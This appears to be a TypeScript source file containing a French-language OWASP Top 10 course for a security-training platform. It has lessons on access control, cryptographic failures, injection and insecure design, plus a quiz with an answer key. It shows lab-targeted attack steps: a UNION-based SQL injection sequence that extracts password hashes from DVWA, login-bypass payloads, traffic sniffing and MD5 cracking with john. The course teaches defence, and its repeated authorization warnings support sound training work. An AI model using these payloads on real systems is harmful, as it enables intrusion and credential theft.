import type { Course } from "./types";
import { h, p, list, code, callout } from "./helpers";

export const OWASP_TOP_10_COURSE: Course = {
  id: "owasp-top-10",
  levelId: 5,
  title: "OWASP Top 10",
  description:
    "Identifier et exploiter les 10 vulnérabilités web majeures (OWASP 2021) : injection, XSS, IDOR, SSRF et bien plus, avec des laboratoires pratiques sur DVWA, Juice Shop et les labs PortSwigger.",
  xp: 1500,
  modules: [
    {
      id: "owasp-module-1",
      title: "L'OWASP, la méthode, et les trois premières familles",
      lessons: [
        {
          id: "owasp-lecon-01",
          title: "Qu'est-ce que l'OWASP Top 10 ?",
          type: "theory",
          duration: "15 min",
          blocks: [
            h("La carte des portes du château"),
            p(
              "Imagine que tu entres dans un château fort. Pour le prendre, tu n'as pas besoin de connaître chaque pierre du mur : tu dois savoir quelles portes existent, lesquelles sont mal verrouillées, et laquelle est la plus rentable à forcer. Les applications web sont ces châteaux, et les familles de failles sont leurs portes. Le problème : il existe des milliers de failles différentes. Où commencer ?"
            ),
            p(
              "C'est exactement la question que se pose l'OWASP depuis 2003. OWASP signifie Open Worldwide Application Security Project (projet ouvert de sécurité des applications). C'est une organisation à but non lucratif fondée en 2001, financée par des dons et des adhésions. Elle ne vend rien : elle produit des standards, des guides, des outils gratuits (comme ZAP, un proxy d'interception) et surtout le Top 10."
            ),
            h("Le Top 10 : un radar, pas une encyclopédie"),
            p(
              "Le Top 10 est le classement des dix familles de failles web les plus répandues et les plus dangereuses. Il est réactualisé tous les 3-4 ans après analyse de plusieurs centaines de milliers d'applications réelles fournies par les entreprises membres. Le classement que tu vas étudier ici (la version 2021) est le fruit de l'analyse de 347 000+ applications et de plus de 1,4 million de cas de vulnérabilités."
            ),
            list(
              "Le Top 10 n'est PAS une liste exhaustive de toutes les failles web.",
              "C'est un radar : les dix familles qu'un professionnel doit connaître en priorité.",
              "La première version date de 2003 ; la version 2021 est la référence actuelle des audits, des certifications et des bug bounty.",
              "Connaître ces dix familles, c'est connaître la carte des portes du château."
            ),
            h("Les dix familles du classement 2021"),
            p(
              "Voici la liste que tu vas apprendre à reconnaître, exploiter et corriger, une par une, dans ce niveau. Chaque famille a un code : A01 pour la première, jusqu'à A10."
            ),
            code(`A01  Broken Access Control             (contrôle d'accès cassé)\nA02  Cryptographic Failures            (échecs cryptographiques)\nA03  Injection                         (SQL, commandes, LDAP, XSS…)\nA04  Insecure Design                   (conception non sécurisée)\nA05  Security Misconfiguration         (mauvaise configuration)\nA06  Vulnerable and Outdated Components (composants obsolètes)\nA07  Identification & Authentication Failures (échecs d'identification)\nA08  Software & Data Integrity Failures (échecs d'intégrité)\nA09  Security Logging & Monitoring Failures (absence de journalisation)\nA10  Server-Side Request Forgery       (SSRF)`),
            h("Pourquoi un pentester doit-il connaître ce classement ?"),
            p(
              "Le Top 10 est la langue commune de toute la profession. Un audit web complet commence toujours par ces familles : ton rapport s'organise naturellement autour des A01 à A10. Les scanners automatiques marquent leurs résultats avec ces codes, les certifications et les entretiens d'embauche s'appuient dessus, et un client te paie pour savoir qu'est-ce qui est cassé et comment le réparer."
            ),
            list(
              "C'est la langue commune : dire « A01 : Broken Access Control » est compris partout dans le monde.",
              "C'est le socle de la méthodologie : chaque famille te dit où chercher et que vérifier.",
              "C'est mesurable : chaque famille a des exemples, des CWE et des contrôles.",
              "C'est ce que les clients attendent : ton rapport final se lit par catégorie OWASP."
            ),
            h("La grille d'impact : CIA"),
            p(
              "Pour évaluer une faille, on utilise partout la grille CIA : Confidentialité, Intégrité, Disponibilité. Confidentialité : qui peut lire ce qui doit rester secret ? Intégrité : qui peut modifier des données sans autorisation ? Disponibilité : qui peut empêcher le service de fonctionner ? Tout rapport de sécurité parle cette langue."
            ),
            h("Le cadre avant tout"),
            p(
              "Ce niveau va te montrer des payloads réels. Ils sont pédagogiques et non destructifs : ils lisent, ils affichent, ils prouvent — ils ne suppriment rien. Mais la règle d'or reste absolue : on ne teste que ce qui nous appartient, une machine virtuelle isolée, ou une plateforme d'entraînement qui nous y autorise."
            ),
            callout(
              "Toutes les commandes et payloads de ce cours se pratiquent UNIQUEMENT sur des applications que tu possèdes (DVWA sur 127.0.0.1, Juice Shop en local), des machines virtuelles isolées, ou des plateformes qui t'y autorisent (labs PortSwigger, TryHackMe, Root-Me, HackTheBox). Tester un site, un serveur ou une application dont tu n'as pas l'autorisation écrite est un délit : en France, l'article 323-1 du Code pénal punit l'accès frauduleux à un système informatique jusqu'à 5 ans d'emprisonnement et 150 000 € d'amende.",
              "danger"
            ),
            h("En résumé"),
            list(
              "L'OWASP est une organisation à but non lucratif qui produit des références gratuites de sécurité applicative.",
              "Le Top 10 2021 est le classement des dix familles de failles les plus répandues et dangereuses.",
              "Chaque famille porte un code A01 → A10, utilisé dans les audits, les certifications et les bug bounty.",
              "Ce niveau transforme le vocabulaire web du niveau 4 en maladies : ce qui se cache derrière chaque réponse HTTP."
            ),
            callout(
              "Un quiz intermédiaire t'attend à la fin du module 1, et un quiz final de synthèse en fin de niveau. Tout ce qui y est demandé sera vu dans les leçons.",
              "info"
            )
          ]
        },
        {
          id: "owasp-lecon-02",
          title: "La méthodologie de test d'une application web",
          type: "theory",
          duration: "15 min",
          blocks: [
            h("Le cycle de vie d'une faille vue par un pentester"),
            p(
              "Avant d'envoyer le premier payload, il faut une méthode. Un pentester professionnel suit toujours le même cycle pour chaque vulnérabilité : reconnaître le symptôme, comprendre le mécanisme, prouver l'exploit en labo, estimer l'impact, corriger et protéger, documenter et rapporter."
            ),
            code(`Reconnaître  →  Comprendre  →  Prouver  →  Estimer  →  Corriger  →  Rapporter\n   │             │             │           │           │           │\nsymptômes    pourquoi       payload    impact CIA    bonnes     preuves\net signaux   c'est vulnérable non destructif           pratiques  reproductibles`),
            h("La méthode, étape par étape"),
            list(
              "1. Cartographier : connaître les fonctionnalités, les technologies, les entrées utilisateur (formulaires, API, paramètres d'URL).",
              "2. Tester une hypothèse à la fois : envoyer une entrée précise et observer la différence de réponse.",
              "3. Prouver de façon non destructive : on lit, on affiche, on copie une réponse — on ne supprime rien.",
              "4. Classer la faille dans la bonne famille OWASP avec son impact (confidentialité, intégrité, disponibilité).",
              "5. Documenter chaque preuve : cible, entrée exacte, requête complète, résultat, horodatage."
            ),
            h("Le scoping : ton périmètre d'autorisation"),
            p(
              "Avant tout test, il y a le scope : la liste exacte des adresses, domaines et méthodes que tu as le droit de tester. Dans la vie professionnelle, ce périmètre est écrit dans un contrat. Dès que tu sors du périmètre, tu arrêtes, tu documentes, tu signales — tu n'exploites pas. C'est la ligne rouge de la profession."
            ),
            h("Ton environnement de laboratoire"),
            p(
              "Tu vas travailler avec trois terrains d'entraînement gratuits. DVWA (Damn Vulnerable Web Application) est une application web volontairement vulnérable, parfaite pour la SQLi et le XSS. OWASP Juice Shop est une boutique de démonstration moderne pleine de défis. Les labs de la PortSwigger Web Security Academy sont des exercices guidés en ligne qui t'autorisent explicitement les tests."
            ),
            code(`# DVWA en local (Docker)\ndocker run -d -p 8080:80 vulnerables/web-dvwa\n\n# OWASP Juice Shop en local (Docker)\ndocker run -d -p 3000:3000 bkimminich/juice-shop\n\n# Puis ouvrir dans le navigateur :\n# http://localhost:8080   (DVWA)\n# http://localhost:3000   (Juice Shop)`),
            h("La boîte à outils minimale"),
            list(
              "curl : envoyer des requêtes précises en ligne de commande, avec cookies et données de formulaire.",
              "Burp Suite Community ou ZAP : un proxy intercepteur pour lire, modifier et rejouer chaque requête.",
              "gobuster / dirsearch : énumérer les répertoires et les fichiers.",
              "hydra : tester des mots de passe en masse (bruteforce), sur labo uniquement.",
              "sqlmap : automatiser la détection et l'exploitation des injections SQL (vu en leçon 24)."
            ),
            h("Le réflexe non destructif"),
            p(
              "Un payload destructif (DROP TABLE, DELETE, suppression de données) est interdit même en labo partagé. Un pentester prouve avec des lectures et des affichages ; s'il doit tester une modification, il utilise un environnement jetable et une valeur témoin. Cette discipline protège la cible, la mission, et toi."
            ),
            callout(
              "Avant chaque test, note la cible, l'entrée, la requête complète et le résultat attendu. C'est ta matière première pour le rapport — et ta protection en cas de litige. La qualité d'un pentester se juge à la reproductibilité de ses preuves.",
              "tip"
            ),
            callout(
              "L'autorisation est le critère, pas l'heure ni l'anonymat. Tester un site réel « juste pour voir » est un délit, même sans intention de nuire. Les labos de ce cours sont faits pour que tu fasses tes erreurs sans conséquences.",
              "danger"
            ),
            h("En résumé"),
            list(
              "Un test suit toujours le cycle : reconnaître, comprendre, prouver, estimer, corriger, rapporter.",
              "Le scope définit ce que tu as le droit de tester ; hors scope, on n'exploite pas.",
              "DVWA, Juice Shop et les labs PortSwigger sont tes terrains d'entraînement.",
              "On prouve de façon non destructive et reproductible, toujours sur des labos autorisés."
            )
          ]
        },
        {
          id: "owasp-lecon-03",
          title: "A01 — Broken Access Control et IDOR",
          type: "theory",
          duration: "18 min",
          blocks: [
            h("Deux questions que l'application doit toujours se poser"),
            p(
              "Le contrôle d'accès est la règle qui décide qui a le droit de voir ou de faire quoi. L'application doit vérifier, à chaque requête, deux choses : l'authentification (es-tu bien celui que tu prétends être ?) et l'autorisation (as-tu le droit de faire cette action précise ?). Broken Access Control signifie que ces vérifications sont absentes, mal écrites ou contournables."
            ),
            p(
              "C'est la famille n°1 du classement 2021, avec un taux d'occurrence de 94,52 %. L'attaquant n'a pas besoin d'être administrateur du serveur : il lui suffit souvent de modifier un paramètre dans l'URL ou la requête."
            ),
            h("Les quatre sous-familles"),
            list(
              "IDOR (Insecure Direct Object Reference) : l'application utilise un identifiant fourni par l'utilisateur sans vérifier qu'il en a le droit. Exemple : GET /facture/123 modifié en GET /facture/124.",
              "Escalade de privilèges : un utilisateur normal accède à des fonctions d'administrateur. Exemple : forcer role=admin dans un formulaire, ou appeler une URL /admin non protégée.",
              "Force browsing : deviner ou énumérer des ressources qui ne doivent pas être publiques. Exemple : /backup.zip, /config.php, /users.csv.",
              "Contournement de contrôle : la vérification n'est faite que côté client, ou sur une seule action. Exemple : le bouton « supprimer » est masqué côté client, mais la route POST reste accessible."
            ),
            h("Pourquoi c'est dangereux"),
            p(
              "C'est la faille silencieuse : aucune erreur, aucun crash. Le serveur répond 200 OK avec les données de quelqu'un d'autre, et personne ne le remarque. L'impact est direct : lecture des données des autres utilisateurs, modification, suppression, prise de contrôle d'un compte admin. Concrètement : l'employé junior peut lire les salaires, l'acheteur peut voir la liste des clients, un inconnu peut modifier l'article d'un autre."
            ),
            h("Exemple de code vulnérable"),
            p(
              "Ici, l'identifiant vient de l'URL et n'est jamais comparé à la session. C'est le défaut central de l'IDOR."
            ),
            code(`@app.route("/profil")\ndef profil():\n    user_id = request.args.get("id")   # ← l'utilisateur fournit "id"\n    user = db.query("SELECT * FROM users WHERE id = ?", user_id)\n    return render_template("profil.html", user=user)\n    # Aucune vérification : user.id == session["user_id"]   ← ABSENT !`),
            h("Comment l'exploiter, pas à pas"),
            p(
              "En labo (DVWA ou une application de test que tu possèdes), il suffit de changer l'identifiant dans l'URL et d'observer la réponse. Tu es l'utilisateur 1 ; vérifions si l'application te laisse lire le profil 2."
            ),
            code(`# Je suis l'utilisateur 1. Vérifions si l'application me laisse lire le profil 2 :\ncurl -b "session=<cookie>" "http://127.0.0.1:8000/profil?id=2"`),
            p(
              "Si la réponse contient le nom, l'email ou le rôle de l'utilisateur 2, l'IDOR est prouvé. La variante professionnelle avec Burp Suite : l'onglet Repeater pour la requête ciblée, puis Intruder pour automatiser sur id=1..100 et repérer les réponses de taille différente. Autres tests classiques : remplacer un cookie role=user par role=admin, ou naviguer directement vers /admin avec un compte normal."
            ),
            h("L'erreur classique du débutant"),
            p(
              "Croire que l'UUID protège. Un identifiant imprévisible complique l'énumération mais ne remplace pas le contrôle d'accès. Et tester seulement la ressource visible dans l'interface : un pentester énumère aussi les identifiants adjacents 1, 2, 3, 4… et teste aussi PUT et DELETE sur les ressources d'autrui, pas seulement la lecture."
            ),
            h("Comment s'en protéger"),
            list(
              "Refuser par défaut : tout accès est interdit sauf autorisation explicite (deny by default).",
              "Vérifier la propriété de l'objet côté serveur : if objet.owner_id != session['user_id']: 403.",
              "N'exposer des identifiants directs que si nécessaire ; sinon utiliser des références non prédictibles (UUID) — cela complique l'énumération sans la remplacer.",
              "Appliquer un contrôle d'accès par fonction (rôles) ET par objet (propriété).",
              "Désactiver le listage des répertoires, protéger les fichiers et routes d'administration.",
              "Ne jamais se fier aux contrôles côté client : masquer un bouton n'est pas une sécurité.",
              "Journaliser et surveiller les accès refusés (4xx sur les ressources sensibles)."
            ),
            callout(
              "La distinction clé : dans un IDOR, l'authentification fonctionne (on est bien Alice), c'est l'autorisation par objet qui manque. C'est pourquoi on dit que c'est une faille A01 et non A07. Teste toujours avec deux comptes (Alice et Bob) pour prouver un IDOR en labo.",
              "info"
            ),
            callout(
              "Les tests d'IDOR se font uniquement sur tes labos : DVWA, une application de test que tu possèdes sur 127.0.0.1, ou les labs PortSwigger. Tester l'identifiant d'un autre utilisateur sur un site réel sans autorisation écrite est un délit (article 323-1 du Code pénal).",
              "danger"
            ),
            h("En résumé"),
            list(
              "A01 = les vérifications « qui a le droit de quoi » sont cassées.",
              "L'IDOR est sa forme la plus fréquente : changer un id dans l'URL et lire les données d'un autre.",
              "On distingue authentification (qui es-tu ?) et autorisation (as-tu le droit ?).",
              "La protection : vérifier la propriété côté serveur, refuser par défaut, contrôler par fonction et par objet."
            )
          ]
        },
        {
          id: "owasp-lecon-04",
          title: "A02 — Cryptographic Failures",
          type: "theory",
          duration: "16 min",
          blocks: [
            h("Des secrets qui ne sont pas des secrets"),
            p(
              "Cette catégorie regroupe tous les cas où la cryptographie — la science du chiffrement et du hachage — est absente, mal utilisée ou périmée : données sensibles envoyées ou stockées en clair, mots de passe hachés avec des algorithmes faibles, certificats TLS absents ou obsolètes, générateur d'aléa prévisible."
            ),
            p(
              "En 2021, la catégorie a été renommée de Sensitive Data Exposure (exposition de données sensibles) vers Cryptographic Failures pour insister sur la cause (mauvaise crypto) plutôt que sur le symptôme (données exposées)."
            ),
            h("Pourquoi c'est dangereux"),
            p(
              "Parce que la protection la plus fondamentale des données — ne pas les laisser lisibles — dépend de choix cryptographiques. Si un attaquant intercepte le trafic (réseau Wi-Fi public, routeur compromis) ou vole un fichier de base de données (sauvegarde, copie de disque), tout ce qui est en clair est lu immédiatement, et tout ce qui est mal chiffré l'est rapidement."
            ),
            p(
              "Les mots de passe hachés en MD5 ou SHA-1, deux fonctions de hachage obsolètes, se craquent en quelques secondes avec hashcat ou john parce qu'ils sont très rapides à calculer — et donc très rapides à essayer en masse."
            ),
            h("Exemple de code vulnérable"),
            code(`<?php\n// 1) Mot de passe stocké avec MD5 : craquable en moins d'une seconde\n$hash = md5($_POST["password"]);   // ← A02 : hachage faible\n\n// 2) Numéro de carte bancaire inséré en clair dans la base\n$sql = "INSERT INTO commandes (carte) VALUES ('" . $_POST["carte"] . "')";\n//                                  ← A02 : donnée sensible en clair\n\n// 3) Pas de redirection HTTPS : le formulaire s'envoie en HTTP (clair)\n//    (le serveur ne force jamais HTTPS)   ← A02\n?>`),
            h("Comment l'exploiter, pas à pas"),
            p(
              "En labo, deux démonstrations classiques : intercepter le trafic non chiffré, et casser un hash MD5 volé dans la base."
            ),
            code(`# 1) Intercepter le trafic non chiffré : sniffer un POST HTTP en clair\nsudo tcpdump -i eth0 -A 'tcp port 80'   # on lit login + mot de passe en clair\n\n# 2) Craquer un hash MD5 volé dans la base\n#    le hash 5f4dcc3b5aa765d61d8327deb882cf99 est le MD5 de "password"\necho -n "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt\njohn --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\n# -> password (md5) : password      (résultat quasi instantané)`),
            p(
              "Autre test important : vérifier si le site force bien HTTPS. L'outil testssl.sh, déjà vu au niveau 4, repère les protocoles TLS obsolètes comme TLS 1.0 et 1.1."
            ),
            code(`testssl.sh https://127.0.0.1:8443   # repère les protocoles TLS obsolètes`),
            h("Le sel (salt) : pourquoi c'est indispensable"),
            p(
              "Le sel est une valeur aléatoire ajoutée avant le hachage, pour que deux mots de passe identiques produisent deux hashs différents. Sans sel, deux comptes avec le même mot de passe ont le même hash — un attaquant le voit d'un coup d'œil, et les tables précalculées (tables arc-en-ciel) rendent le craquage trivial."
            ),
            code(`# Ce que fait bcrypt (lent + salé), en résumé :\n# password + sel_aléatoire → fonction lente → hash\n# Chaque compte a son propre sel : deux "password" donnent deux hashs différents.`),
            h("Comment s'en protéger"),
            list(
              "Forcer HTTPS partout : redirection HTTP vers HTTPS, en-tête Strict-Transport-Security (HSTS), TLS ≥ 1.2 (idéalement 1.3).",
              "Chiffrer les données sensibles au repos : base de données, sauvegardes.",
              "Hacher les mots de passe avec un algorithme lent et salé : bcrypt, argon2 ou scrypt.",
              "Ne jamais stocker de données inutiles : numéro de carte, CVV, secrets.",
              "Chiffrer avec des algorithmes modernes (AES-256, ChaCha20) et garder les clés dans un coffre (vault), jamais dans le code source.",
              "Gérer le cycle de vie des certificats : renouvellement automatique, révocation."
            ),
            callout(
              "MD5 et SHA-1 sont cassés et ultra-rapides, donc craquables en masse : ils ne conviennent JAMAIS aux mots de passe. SHA-256 est sûr pour les signatures mais trop rapide pour les mots de passe. Pour les mots de passe : bcrypt, argon2 ou scrypt, lents et salés.",
              "tip"
            ),
            callout(
              "Le craquage de hash et le sniffing de trafic s'exercent uniquement sur tes labos : ta propre base de test, tes propres paquets, ton réseau. Intercepter le trafic d'un tiers ou casser des hashs volés sur un vrai site est un délit.",
              "danger"
            ),
            h("En résumé"),
            list(
              "A02 = « tes secrets ne sont pas des secrets » : pas de TLS, hachage faible, stockage en clair.",
              "Une base se vole (sauvegarde, injection SQL…) : tout ce qui est en clair est alors lu immédiatement.",
              "MD5 et SHA-1 se craquent en secondes ; bcrypt/argon2/scrypt sont conçus pour les mots de passe.",
              "Le sel garantit que deux mots de passe identiques donnent deux hashs différents."
            )
          ]
        },
        {
          id: "owasp-lecon-05",
          title: "A03 — Injection et SQLi",
          type: "theory",
          duration: "20 min",
          blocks: [
            h("Quand tes données deviennent du code"),
            p(
              "L'injection est une famille d'attaques où des données fournies par l'utilisateur sont interprétées comme du code ou des instructions par l'application. Le cas le plus célèbre est l'injection SQL (SQLi) : insérer du code SQL malveillant dans une requête à la base de données. Mais la famille regroupe aussi l'injection de commandes, l'injection LDAP, le XXE et le XSS (que tu verras en détail en leçon 15)."
            ),
            h("Le mécanisme, simplement"),
            p(
              "Une requête SQL est une phrase construite par l'application. Exemple : SELECT * FROM clients WHERE id = '1'. Le nombre vient du champ que l'utilisateur a rempli. Si le programme colle cette entrée directement dans la phrase (concaténation), alors l'utilisateur peut envoyer du texte qui ferme la phrase et en écrit une autre. C'est exactement comme si tu laissais quelqu'un finir ta phrase à ta place."
            ),
            code(`-- Ce que l'application construit quand tu tapes   1' OR '1'='1'-- -\nSELECT * FROM clients WHERE id = '1' OR '1'='1'-- -' ;\n--                       └──┬───┘└───┬───┘ └─┬─┘\n--                    fermeture   OR toujours vrai  commentaire : le reste est ignoré\n-- La condition est TOUJOURS vraie → la requête retourne TOUTES les lignes`),
            h("Les trois grandes techniques"),
            list(
              "UNION-based : fusionner les résultats de la requête normale avec ceux d'une autre requête, pour lire ce qu'on veut. Payload : ' UNION SELECT username, password FROM users-- -",
              "Boolean-based (aveugle) : faire varier une condition VRAI/FAUX et observer la différence de réponse. ' AND 1=1-- - (réponse normale) vs ' AND 1=2-- - (réponse vide).",
              "Time-based (aveugle temporel) : déclencher un délai pour valider une hypothèse. ' AND SLEEP(5)-- - (la page met 5 secondes à répondre)."
            ),
            h("Exemple de code vulnérable"),
            p(
              "C'est le vrai code de DVWA en niveau low. L'entrée brute est concaténée directement dans la requête."
            ),
            code(`<?php\n$id = $_GET['id'];   // ← entrée brute, sans validation\n$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";\n//                    concaténation directe  ← A03 INJECTION\n$result = mysqli_query($GLOBALS["___mysqli_ston"], $query);\n?>`),
            h("Comment l'exploiter, pas à pas"),
            p(
              "Voici la séquence de tests à faire sur DVWA en niveau low. Tu vas détecter la faille, compter les colonnes, puis lire la base."
            ),
            code(`# 1) Tester avec un caractère apostrophe : l'erreur SQL révèle la structure\nhttp://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1'&Submit=Submit\n# -> "You have an error in your SQL syntax..."\n\n# 2) Tester le nombre de colonnes avec ORDER BY\nhttp://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1' ORDER BY 3-- -&Submit=Submit   # OK\nhttp://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1' ORDER BY 4-- -&Submit=Submit   # erreur → 3 colonnes\n\n# 3) Extraire la version et l'utilisateur de la base\nhttp://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1' UNION SELECT 1, version()-- -&Submit=Submit\n\n# 4) Lister les tables de la base courante (via information_schema)\nhttp://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1' UNION SELECT 1, table_name FROM information_schema.tables-- -&Submit=Submit\n\n# 5) Lire les colonnes de la table users\nhttp://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users'-- -&Submit=Submit\n\n# 6) Extraire les identifiants et les hashs de mots de passe\nhttp://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1' UNION SELECT user, password FROM users-- -&Submit=Submit`),
            h("L'encodage URL : le réflexe qui sauve tes payloads"),
            p(
              "Dans une URL, les espaces deviennent %20, les apostrophes %27, les virgules %2C. Le payload 1' UNION SELECT user, password FROM users-- - s'écrit donc : 1%27%20UNION%20SELECT%20user%2C%20password%20FROM%20users--%20-."
            ),
            p(
              "Erreurs classiques du débutant : oublier la fermeture du guillemet (la requête originale contient WHERE id = '$id', ton payload doit fermer la chaîne avec ' ou commenter la fin avec -- -) ; oublier l'espace après -- (-- est un commentaire MySQL, --x ne l'est pas toujours) ; et oublier que commentaires et guillemets changent selon la base : # et -- pour MySQL, -- pour PostgreSQL/MSSQL, /* */ pour Oracle."
            ),
            h("Comment s'en protéger"),
            list(
              "Requêtes préparées (paramètres liés) : la structure de la requête et les valeurs arrivent séparément à l'interpréteur — les données ne sont plus interprétées comme du code.",
              "Séparer toujours les données du code : c'est la défense universelle contre toutes les injections.",
              "Valider les entrées par liste blanche (autoriser ce qui est connu) plutôt que par liste noire.",
              "Moindre privilège sur le compte de base de données de l'application.",
              "Encoder la sortie selon le contexte (vu en leçon 15 avec le XSS)."
            ),
            code(`// La correction : une requête préparée en PHP\n$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");\n$stmt->bind_param("s", $user);`),
            callout(
              "Le payload admin'-- - dans un champ username neutralise la vérification du mot de passe : la requête devient WHERE username = 'admin'-- -' AND password = 'x', le commentaire -- - ignore tout le reste. Tu te connectes comme admin sans connaître son mot de passe. Tout cela se teste UNIQUEMENT en labo (DVWA, Juice Shop, PortSwigger).",
              "warning"
            ),
            callout(
              "L'injection SQL sur un site réel sans autorisation écrite est un délit. Et sur un labo, on ne lance jamais de payload destructif : on lit la base, on ne la modifie ni ne la supprime.",
              "danger"
            ),
            h("En résumé"),
            list(
              "A03 = « tes données sont devenues du code » : l'application transmet l'entrée brute à un interpréteur.",
              "SQLi : UNION pour lire, boolean-based et time-based quand rien ne s'affiche.",
              "La défense universelle : requêtes préparées, encodage de sortie, listes blanches.",
              "Une seule entrée mal validée peut donner accès à toute la base de données."
            )
          ]
        },
        {
          id: "owasp-lecon-06",
          title: "Quiz intermédiaire 1 — Fondations, A01, A02, A03",
          type: "quiz",
          duration: "10 min",
          blocks: [
            p(
              "Premier bilan : l'OWASP, la méthodologie, le contrôle d'accès, la cryptographie et l'injection. 6 questions. 80 % pour valider ce module."
            ),
            callout(
              "Relis les leçons 1 à 5 si une question te semble difficile : tout ce qui est demandé y est expliqué, et chaque payload s'exerce en labo.",
              "info"
            )
          ],
          quiz: [
            {
              question: "Que signifie l'acronyme OWASP ?",
              options: [
                "Open Web Application Security Protocol",
                "Open Worldwide Application Security Project",
                "Organization of Web Application Security Professionals",
                "Open World Application Security Process",
              ],
              answer: 1,
              explanation:
                "OWASP est une organisation à but non lucratif. Le « Web » a été remplacé par « Worldwide » en 2022, d'où les pièges des réponses A et D.",
            },
            {
              question: "Quelle catégorie est n°1 du Top 10 2021 ?",
              options: [
                "Injection",
                "Broken Access Control",
                "Cryptographic Failures",
                "SSRF",
              ],
              answer: 1,
              explanation:
                "Broken Access Control est n°1 avec 94,52 % d'occurrence. L'injection, qui était n°1 en 2017, est passée 3e en 2021.",
            },
            {
              question: "Un employé connecté modifie id dans l'URL et lit la facture d'un collègue. Quelle famille ?",
              options: [
                "A03 Injection",
                "A07 Identification and Authentication Failures",
                "A01 Broken Access Control (IDOR)",
                "A02 Cryptographic Failures",
              ],
              answer: 2,
              explanation:
                "L'authentification fonctionne (il est connecté), c'est l'autorisation par objet qui manque : c'est un IDOR, sous-famille du Broken Access Control (A01).",
            },
            {
              question: "Quel hachage de mot de passe est le plus robuste ?",
              options: ["MD5", "SHA-1", "bcrypt (avec sel)", "SHA-256 seul"],
              answer: 2,
              explanation:
                "MD5 et SHA-1 sont cassés et ultra-rapides (donc craquables en masse). SHA-256 est sûr pour les signatures mais trop rapide pour les mots de passe. bcrypt/argon2/scrypt sont lents et salés.",
            },
            {
              question: "Quel payload ferme correctement une chaîne SQL MySQL et commente la suite ?",
              options: [
                "1 AND 1=1#",
                "1' OR '1'='1'-- -",
                '1" OR "1"="1',
                "1' OR 1=1/*",
              ],
              answer: 1,
              explanation:
                "Le ' ferme la chaîne, l'OR '1'='1' est toujours vrai, et -- - commente le reste. La réponse A oublie le guillemet de fermeture.",
            },
            {
              question: "Dans un IDOR, quelle distinction est la clé ?",
              options: [
                "Le mot de passe est trop faible",
                "L'authentification fonctionne mais l'autorisation par objet manque",
                "Le serveur n'est pas à jour",
                "Le certificat TLS est expiré",
              ],
              answer: 1,
              explanation:
                "L'utilisateur est bien authentifié, mais le serveur ne vérifie pas son droit sur l'objet demandé. C'est une faille d'autorisation (A01), pas d'authentification (A07).",
            },
          ],
        },
      ],
    },
    {
      id: "owasp-module-2",
      title: "Design, configuration, composants et authentification",
      lessons: [
        {
          id: "owasp-lecon-07",
          title: "A04 — Insecure Design",
          type: "theory",
          duration: "15 min",
          blocks: [
            h("Mal coder ou mal penser ?"),
            p(
              "Cette catégorie, nouvelle en 2021, ne concerne pas une erreur de code mais un défaut de conception : l'architecture de l'application suppose des choses fausses sur ses utilisateurs, ses flux ou ses limites. C'est la différence entre mal coder (A03, A05) et mal penser."
            ),
            p(
              "Exemples : une application qui n'a pas de limite de crédit sur une fonction « recharger mon compte », une procédure de réinitialisation de mot de passe qui n'exige rien de plus que l'email, un quiz dont la note est calculée côté client."
            ),
            h("Pourquoi c'est dangereux"),
            p(
              "Parce que les défauts de conception sont là dès la naissance de l'application, et qu'aucun correctif de code ne les répare : il faut repenser le flux. Un attaquant qui trouve une logique métier cassée peut se payer lui-même des crédits, acheter à -100 %, voter plusieurs fois, ou réinitialiser le mot de passe d'un autre compte. C'est la famille préférée des bug bounty hunters : elle ne déclenche aucun scanner, elle demande du raisonnement."
            ),
            h("Exemple de code vulnérable"),
            p(
              "Une logique métier : recharger un solde. L'application fait confiance à la quantité reçue, sans plafond ni vérification."
            ),
            code(`@app.post("/recharger")\ndef recharger():\n    # L'application fait confiance à la quantité reçue, sans plafond ni vérification\n    qte = int(request.form["qte"])    # ← l'utilisateur envoie -10000\n    compte.solde += qte               # ← son solde AUGMENTE`),
            h("Comment l'exploiter, pas à pas"),
            p(
              "En labo (Juice Shop regorge de ces défis), on cherche des préconditions abusables : envoyer une quantité négative, un prix négatif, un identifiant de promotion sans lien avec le compte, rejouer une étape, contourner un flux en appelant directement la deuxième étape."
            ),
            p(
              "La méthode : cartographier le flux métier, identifier ce que l'application suppose implicitement, puis tester chaque supposition. Le champ de notation « 0 étoile » interdit dans l'interface, mais accepté par l'API (défi Zero Stars de Juice Shop), en est l'exemple type : l'interface n'est pas une sécurité."
            ),
            code(`# Sur Juice Shop (labo) : intercepter la requête de notation et envoyer 0\n# PUT /api/Reviews/<id>\n# { "rating": 0 }\n# -> { "status": "success" }   : l'API accepte une valeur hors bornes que l'UI interdit`),
            h("Comment s'en protéger"),
            list(
              "Modéliser les menaces et les limites dès la conception : à quel point l'état le plus mauvais peut-il devenir pire ?",
              "Fixer des règles métier vérifiées côté serveur : plafonds, unicité, séquence des étapes.",
              "Limiter les débits (rate limiting) sur les opérations sensibles.",
              "Tester les flux critiques avec des scénarios adverses : quantités négatives, rejeu, réordonnancement des étapes."
            ),
            callout(
              "La différence avec les autres familles : ici, il n'y a pas de ligne de code à corriger — c'est l'architecture qui suppose des choses fausses. Un simple correctif de ligne ne suffit pas, il faut repenser le flux.",
              "info"
            ),
            callout(
              "Les tests de logique métier se font sur des labos qui t'autorisent explicitement ces manipulations (Juice Shop, labs PortSwigger). Tester des quantités négatives ou des étapes contournées sur un vrai site de paiement est un délit.",
              "danger"
            ),
            h("En résumé"),
            list(
              "A04 = « le problème est dans les plans, pas dans les murs ».",
              "Ce sont des défauts de conception, pas des erreurs de code isolées.",
              "L'exploitation repose sur la cartographie du flux métier et le test de chaque supposition implicite.",
              "La protection : règles métier côté serveur, plafonds, rate limiting, scénarios adverses."
            )
          ]
        },
        {
          id: "owasp-lecon-08",
          title: "A05 — Security Misconfiguration",
          type: "theory",
          duration: "16 min",
          blocks: [
            h("Les réglages par défaut sont des hypothèques"),
            p(
